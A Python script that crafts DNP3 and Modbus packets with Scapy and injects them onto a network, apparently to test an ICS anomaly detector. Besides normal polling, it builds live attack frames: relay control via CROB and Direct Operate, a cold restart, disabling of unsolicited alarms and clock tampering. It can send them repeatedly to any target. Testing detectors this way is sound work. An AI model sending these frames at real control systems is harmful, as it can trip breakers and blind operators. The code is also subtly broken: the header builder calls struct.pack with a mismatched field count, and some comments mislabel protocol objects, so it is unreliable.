"""
DNP3 & Modbus Packet Crafter — ICS traffic simulation using Scapy.

Crafts raw DNP3 Data Link frames and Modbus TCP exception packets and injects
them into the network to test Netscope Desktop's anomaly detection.

DNP3 frame structure (IEEE Std 1815-2012):
  Start bytes: 0x05 0x64
  Length:      1 byte (octets from Ctrl to last CRC)
  Control:     1 byte
  Destination: 2 bytes LE
  Source:      2 bytes LE
  CRC:         2 bytes (covers header bytes 0-7)
  [payload + CRC blocks...]

This script uses Raw() layers with struct.pack — Scapy's DNP3 contrib layer
is not included in all installations.

Usage:
  # Send a DNP3 sequence (requires root/admin or Npcap on Windows)
  python simulate_dnp3.py --interface eth0 --src-ip 192.168.1.10 --dst-ip 192.168.1.1

  # Just craft and print packets (no send, for testing)
  python simulate_dnp3.py --dry-run

  # Also inject Modbus exception packets
  python simulate_dnp3.py --interface eth0 --with-modbus-exceptions

  # Run continuously for 60 seconds, saving to PCAP
  python simulate_dnp3.py --duration 60 --pcap-output dnp3_traffic.pcap --dry-run

  # Run indefinitely until Ctrl+C
  python simulate_dnp3.py --continuous --pcap-output dnp3_traffic.pcap --dry-run

Dependencies:
  pip install scapy
"""

from __future__ import annotations
import argparse
import signal
import struct
import sys
import time
from pathlib import Path
from typing import Optional


# ── CRC-16 for DNP3 ──────────────────────────────────────────────────────────

def _dnp3_crc(data: bytes) -> int:
    """Compute DNP3 CRC-16 (0x3D65 polynomial, bit-reversed)."""
    crc = 0x0000
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x0001:
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc >>= 1
    return (~crc) & 0xFFFF


def _append_crc(data: bytes) -> bytes:
    crc = _dnp3_crc(data)
    return data + struct.pack("<H", crc)


# ── DNP3 frame builder ────────────────────────────────────────────────────────

def _dnp3_header(length: int, ctrl: int, dst: int, src: int) -> bytes:
    """Build DNP3 Data Link header (10 bytes with CRC)."""
    header_no_crc = struct.pack("<BBHHBbB",
        0x05, 0x64,   # start bytes
        length,       # length field
        ctrl,         # control byte
        dst, src,     # destination, source (LE 16-bit)
    )
    # Actually the format is: start(2) + len(1) + ctrl(1) + dst(2) + src(2) = 8 bytes
    header_no_crc = bytes([0x05, 0x64, length, ctrl]) + struct.pack("<HH", dst, src)
    return _append_crc(header_no_crc)   # 8 + 2 = 10 bytes


def _dnp3_transport(fir: bool = True, fin: bool = True, seq: int = 0) -> int:
    """Build DNP3 Transport Layer octet."""
    return ((0x80 if fir else 0) | (0x40 if fin else 0) | (seq & 0x3F))


def _dnp3_al_header(fc: int, fir: bool = True, fin: bool = True,
                    con: bool = False, seq: int = 0) -> bytes:
    """Build DNP3 Application Layer header (2 bytes)."""
    ctrl = ((0x80 if fir else 0) | (0x40 if fin else 0) |
            (0x20 if con else 0) | (seq & 0x0F))
    return bytes([ctrl, fc])


def _build_dnp3_frame(src: int, dst: int, al_func: int, al_payload: bytes = b"",
                      seq: int = 0) -> bytes:
    """
    Build a complete DNP3 Data Link frame.

    Returns raw bytes suitable for Scapy Raw() or struct operations.
    """
    tl_byte = _dnp3_transport(fir=True, fin=True, seq=seq)
    al = _dnp3_al_header(al_func, fir=True, fin=True, seq=seq) + al_payload

    # First payload block (up to 16 bytes of user data + CRC per block)
    payload_no_crc = bytes([tl_byte]) + al
    # Split into 16-byte chunks, append CRC to each
    payload_with_crcs = b""
    for i in range(0, len(payload_no_crc), 16):
        chunk = payload_no_crc[i:i + 16]
        payload_with_crcs += _append_crc(chunk)

    # Length = 5 (header fields after length) + len(payload_no_crc)
    length = 5 + len(payload_no_crc)
    header = _dnp3_header(length, ctrl=0x44, dst=dst, src=src)  # 0x44 = primary, unconfirmed
    return header + payload_with_crcs


def craft_dnp3_read(src: int, dst: int, obj_group: int = 30, obj_variation: int = 1,
                    seq: int = 0) -> bytes:
    """DNP3 Read request for a specific object group/variation."""
    # AL payload: qualifier (0x06 = all objects), group, variation
    al_payload = bytes([obj_group, obj_variation, 0x06])
    return _build_dnp3_frame(src, dst, al_func=0x01, al_payload=al_payload, seq=seq)


def craft_dnp3_write(src: int, dst: int, obj_group: int = 12, obj_variation: int = 1,
                     value: int = 0xFF, seq: int = 1) -> bytes:
    """
    DNP3 Write command (FC 0x02).

    obj_group=12, obj_variation=1 → Binary Output Command (CROB) — controls relays.
    value byte: control code (0xFF = latch on, 0x03 = pulse on, etc.)
    """
    # Minimal CROB: qualifier(0x28 = 1 object, index prefix), count=1, index=0, control_code, ...
    al_payload = bytes([
        obj_group, obj_variation,
        0x28,            # qualifier: 8-bit count, 8-bit index
        0x01,            # count = 1
        0x00,            # index = 0
        value,           # control code
        0x00,            # op type
        0x00, 0x00, 0x00, 0x00,  # on time (ms) - 4 bytes
        0x00, 0x00, 0x00, 0x00,  # off time (ms) - 4 bytes
        0x00,            # status
    ])
    return _build_dnp3_frame(src, dst, al_func=0x02, al_payload=al_payload, seq=seq)


def craft_dnp3_direct_operate(src: int, dst: int, seq: int = 2) -> bytes:
    """DNP3 Direct Operate (FC 0x05) — no handshake, immediate relay action."""
    al_payload = bytes([12, 1, 0x28, 0x01, 0x00, 0xFF, 0x00,
                        0x64, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00])
    return _build_dnp3_frame(src, dst, al_func=0x05, al_payload=al_payload, seq=seq)


def craft_dnp3_unsolicited_response(src: int, dst: int, seq: int = 3) -> bytes:
    """DNP3 Unsolicited Response (FC 0x82) — RTU spontaneously sending data."""
    # Minimal IIN (2 bytes) + one analog input object (Group 30, Var 1)
    al_payload = bytes([
        0x00, 0x00,              # IIN bytes (no error flags)
        30, 1,                   # Group 30, Variation 1 (32-bit Analog Input)
        0x28, 0x01, 0x00,        # qualifier, count=1, index=0
        0xF4, 0x01, 0x00, 0x00, # value = 500 (little-endian 32-bit)
    ])
    return _build_dnp3_frame(src, dst, al_func=0x82, al_payload=al_payload, seq=seq)


def craft_dnp3_cold_restart(src: int, dst: int, seq: int = 4) -> bytes:
    """
    DNP3 Cold Restart (FC 0x0d) — master commanding outstation to restart.

    This is a highly sensitive operation in ICS environments. A cold restart
    clears volatile memory, resets all process I/O, and forces the outstation
    back to its initialization state. Unauthorized cold restarts can:
      - Drop active relay/breaker control mid-operation
      - Lose unsaved setpoint/config changes
      - Cause momentary loss of monitoring visibility
    """
    # Cold restart has no additional payload — just the FC
    return _build_dnp3_frame(src, dst, al_func=0x0D, al_payload=b"", seq=seq)


def craft_dnp3_disable_unsolicited(src: int, dst: int, seq: int = 5) -> bytes:
    """
    DNP3 Disable Unsolicited Responses (FC 0x15).

    Silences the outstation's autonomous reporting — a common attack vector
    to blind the SCADA master from seeing alarms and state changes.
    """
    # Disable unsolicited for Class 1, 2, 3 objects
    al_payload = bytes([
        60, 2, 0x06,   # Class 1 (Group 60, Var 2, all)
        60, 3, 0x06,   # Class 2 (Group 60, Var 3, all)
        60, 4, 0x06,   # Class 3 (Group 60, Var 4, all)
    ])
    return _build_dnp3_frame(src, dst, al_func=0x15, al_payload=al_payload, seq=seq)


def craft_dnp3_write_time(src: int, dst: int, seq: int = 6) -> bytes:
    """
    DNP3 Write (FC 0x02) targeting Group 50 Var 1 — Time and Date.

    Sets the outstation's clock. If tampered, causes event timestamps to
    become unreliable, undermining forensic analysis.
    """
    # Group 50 Var 1 = Internal Indications / Time
    # Qualifier 0x07 (single 48-bit value), count=1
    # Timestamp: arbitrary future value (2030-01-01 00:00:00 UTC in ms)
    ts_ms = 1893456000000  # 2030-01-01 epoch ms
    al_payload = bytes([50, 1, 0x07, 0x01]) + struct.pack("<Q", ts_ms)[:6]
    return _build_dnp3_frame(src, dst, al_func=0x02, al_payload=al_payload, seq=seq)


# ── Modbus exception packet ───────────────────────────────────────────────────

def craft_modbus_exception(src_ip: str, dst_ip: str,
                           unit_id: int = 1, orig_fc: int = 3,
                           exception_code: int = 2) -> "scapy_packet":
    """
    Craft a Modbus exception response packet using Scapy.

    Exception response: FC = orig_fc | 0x80, followed by exception_code.
    exception_code 2 = Illegal Data Address (out-of-range read attempt).
    """
    try:
        from scapy.all import IP, TCP, Raw
    except ImportError:
        raise ImportError("scapy not installed. Run: pip install scapy")

    transaction_id = 0x0001
    protocol_id    = 0x0000
    length         = 3   # unit_id (1) + fc (1) + exception_code (1)

    mbap = struct.pack(">HHHB", transaction_id, protocol_id, length, unit_id)
    pdu  = bytes([orig_fc | 0x80, exception_code])

    return (
        IP(src=src_ip, dst=dst_ip) /
        TCP(sport=502, dport=12345, flags="PA") /
        Raw(load=mbap + pdu)
    )


# ── Graceful shutdown ────────────────────────────────────────────────────────

_stop_requested = False

def _handle_signal(signum, frame):
    global _stop_requested
    _stop_requested = True
    print("\n[dnp3] Stop requested — finishing current sequence…")

signal.signal(signal.SIGINT, _handle_signal)
signal.signal(signal.SIGTERM, _handle_signal)


# ── Sequence builder ─────────────────────────────────────────────────────────

def _build_full_sequence(src_addr: int, dst_addr: int, seq: int,
                         include_attacks: bool = True) -> list[tuple[str, bytes]]:
    """Build a full DNP3 communication sequence for one cycle."""
    frames: list[tuple[str, bytes]] = [
        ("Read Analog (normal poll)",    craft_dnp3_read(src_addr, dst_addr, seq=seq)),
        ("Write CROB (anomaly)",         craft_dnp3_write(src_addr, dst_addr, seq=seq)),
        ("Direct Operate (critical)",    craft_dnp3_direct_operate(src_addr, dst_addr, seq=seq)),
        ("Unsolicited Response (RTU)",   craft_dnp3_unsolicited_response(dst_addr, src_addr, seq=seq)),
    ]
    if include_attacks:
        frames.extend([
            ("Cold Restart (FC 0x0d)",        craft_dnp3_cold_restart(src_addr, dst_addr, seq=seq)),
            ("Disable Unsolicited (FC 0x15)", craft_dnp3_disable_unsolicited(src_addr, dst_addr, seq=seq)),
            ("Time Tamper (Group 50)",        craft_dnp3_write_time(src_addr, dst_addr, seq=seq)),
        ])
    return frames


# ── Sequence sender ───────────────────────────────────────────────────────────

def send_dnp3_sequence(interface: str, src_ip: str, dst_ip: str,
                       src_addr: int = 1, dst_addr: int = 10,
                       count: int = 5, interval: float = 0.5,
                       duration: Optional[float] = None,
                       continuous: bool = False,
                       pcap_output: Optional[str] = None,
                       include_attacks: bool = True) -> None:
    """
    Send a realistic DNP3 communication sequence.

    Modes:
      - count mode (default): send `count` sequences then stop
      - duration mode: send sequences for `duration` seconds then stop
      - continuous mode: send until Ctrl+C / SIGTERM
      - pcap_output: if set, save all crafted packets to a PCAP file
        (uses scapy wrpcap — no root/admin needed for file write)
    """
    try:
        from scapy.all import IP, UDP, Raw, sendp, Ether, wrpcap
    except ImportError:
        raise ImportError("scapy not installed. Run: pip install scapy")

    global _stop_requested
    _stop_requested = False

    DNP3_PORT = 20000
    all_packets = []  # for pcap output
    total_sent = 0
    start_time = time.monotonic()

    def _should_stop(iteration: int) -> bool:
        if _stop_requested:
            return True
        if continuous:
            return False
        if duration is not None:
            return (time.monotonic() - start_time) >= duration
        return iteration >= count

    i = 0
    while not _should_stop(i):
        seq = i % 16
        sequence = _build_full_sequence(src_addr, dst_addr, seq, include_attacks)

        for label, frame_bytes in sequence:
            if _stop_requested:
                break
            pkt = (
                Ether() /
                IP(src=src_ip, dst=dst_ip) /
                UDP(sport=DNP3_PORT, dport=DNP3_PORT) /
                Raw(load=frame_bytes)
            )
            print(f"[dnp3] Sending: {label} (seq={seq}, {len(frame_bytes)}B)")
            if pcap_output:
                all_packets.append(pkt)
            sendp(pkt, iface=interface, verbose=False)
            total_sent += 1
            time.sleep(interval / len(sequence))

        time.sleep(interval)
        i += 1

    elapsed = time.monotonic() - start_time
    print(f"[dnp3] Done — {total_sent} packets in {elapsed:.1f}s on {interface}")

    if pcap_output and all_packets:
        wrpcap(pcap_output, all_packets)
        print(f"[dnp3] Saved {len(all_packets)} packets to {pcap_output}")


def save_to_pcap(pcap_path: str, src_ip: str, dst_ip: str,
                 src_addr: int = 1, dst_addr: int = 10,
                 count: int = 5, interval: float = 0.0,
                 include_attacks: bool = True) -> None:
    """
    Craft DNP3 packets and save directly to PCAP — no network send needed.

    This mode does NOT require root/admin or Npcap. Useful for generating
    test PCAP files for offline analysis.
    """
    try:
        from scapy.all import IP, UDP, Raw, Ether, wrpcap
    except ImportError:
        raise ImportError("scapy not installed. Run: pip install scapy")

    DNP3_PORT = 20000
    all_packets = []

    for i in range(count):
        seq = i % 16
        sequence = _build_full_sequence(src_addr, dst_addr, seq, include_attacks)

        for label, frame_bytes in sequence:
            pkt = (
                Ether() /
                IP(src=src_ip, dst=dst_ip) /
                UDP(sport=DNP3_PORT, dport=DNP3_PORT) /
                Raw(load=frame_bytes)
            )
            all_packets.append(pkt)

    wrpcap(pcap_path, all_packets)
    print(f"[dnp3] Saved {len(all_packets)} packets ({count} sequences) to {pcap_path}")


# ── Dry-run mode ─────────────────────────────────────────────────────────────

def dry_run(pcap_output: Optional[str] = None, count: int = 5,
            src_ip: str = "192.168.1.10", dst_ip: str = "192.168.1.1",
            include_attacks: bool = True) -> None:
    """Print crafted frames without sending. Optionally save to PCAP."""
    frames = [
        ("DNP3 Read (FC 0x01, Group 30 Var 1)",      craft_dnp3_read(1, 10)),
        ("DNP3 Write (FC 0x02, CROB Group 12)",       craft_dnp3_write(1, 10)),
        ("DNP3 Direct Operate (FC 0x05)",             craft_dnp3_direct_operate(1, 10)),
        ("DNP3 Unsolicited Response (FC 0x82)",       craft_dnp3_unsolicited_response(10, 1)),
        ("DNP3 Cold Restart (FC 0x0d)",               craft_dnp3_cold_restart(1, 10)),
        ("DNP3 Disable Unsolicited (FC 0x15)",        craft_dnp3_disable_unsolicited(1, 10)),
        ("DNP3 Write Time (FC 0x02, Group 50 Var 1)", craft_dnp3_write_time(1, 10)),
    ]

    for name, data in frames:
        hex_str = " ".join(f"{b:02x}" for b in data)
        print(f"\n{name}")
        print(f"  Length: {len(data)} bytes")
        print(f"  Hex:    {hex_str}")

    print("\n[dry-run] Modbus exception packet structure:")
    try:
        pkt = craft_modbus_exception("192.168.1.10", "192.168.1.1")
        pkt.show()
    except ImportError as e:
        print(f"  (scapy not available: {e})")

    if pcap_output:
        save_to_pcap(pcap_output, src_ip, dst_ip,
                     count=count, include_attacks=include_attacks)


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="DNP3 & Modbus Packet Crafter — ICS traffic simulation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  %(prog)s --dry-run                                 # Print frame hex
  %(prog)s --dry-run --pcap-output test.pcap         # Save 5 sequences to PCAP (no root)
  %(prog)s -i eth0 --duration 60                     # Send for 60 seconds
  %(prog)s -i eth0 --continuous --pcap-output out.pcap  # Until Ctrl+C, save PCAP
  %(prog)s -i eth0 --no-attacks                      # Normal polling only
""")
    parser.add_argument("--interface",  "-i", default="eth0",
                        help="Network interface for sending")
    parser.add_argument("--src-ip",     default="192.168.1.10",
                        help="Source IP address")
    parser.add_argument("--dst-ip",     default="192.168.1.1",
                        help="Destination IP address")
    parser.add_argument("--src-addr",   type=int, default=1,
                        help="DNP3 source address (master)")
    parser.add_argument("--dst-addr",   type=int, default=10,
                        help="DNP3 destination address (RTU/outstation)")
    parser.add_argument("--count",      "-n", type=int, default=5,
                        help="Number of full sequences to send (ignored if --duration or --continuous)")
    parser.add_argument("--interval",   type=float, default=0.5,
                        help="Seconds between sequences")
    parser.add_argument("--duration",   type=float, default=None,
                        help="Run for this many seconds then stop (overrides --count)")
    parser.add_argument("--continuous", action="store_true",
                        help="Run indefinitely until Ctrl+C / SIGTERM")
    parser.add_argument("--pcap-output", default=None, metavar="PATH",
                        help="Save all crafted packets to a PCAP file")
    parser.add_argument("--no-attacks", action="store_true",
                        help="Only send normal Read/Response — skip Write/Operate/Restart attacks")
    parser.add_argument("--with-modbus-exceptions", action="store_true",
                        help="Also inject Modbus exception response packets")
    parser.add_argument("--dry-run",    action="store_true",
                        help="Print crafted packets without sending (combine with --pcap-output to save)")
    args = parser.parse_args()

    include_attacks = not args.no_attacks

    if args.dry_run:
        dry_run(pcap_output=args.pcap_output,
                count=args.count,
                src_ip=args.src_ip,
                dst_ip=args.dst_ip,
                include_attacks=include_attacks)
    else:
        send_dnp3_sequence(
            interface=args.interface,
            src_ip=args.src_ip,
            dst_ip=args.dst_ip,
            src_addr=args.src_addr,
            dst_addr=args.dst_addr,
            count=args.count,
            interval=args.interval,
            duration=args.duration,
            continuous=args.continuous,
            pcap_output=args.pcap_output,
            include_attacks=include_attacks,
        )

        if args.with_modbus_exceptions:
            try:
                from scapy.all import sendp
                for exc_code in [1, 2, 4]:
                    pkt = craft_modbus_exception(
                        args.src_ip, args.dst_ip,
                        exception_code=exc_code,
                    )
                    print(f"[modbus] Injecting exception response code={exc_code}")
                    sendp(pkt, iface=args.interface, verbose=False)
                    time.sleep(0.1)
            except ImportError:
                print("[modbus] scapy not available — skipping Modbus exception injection")
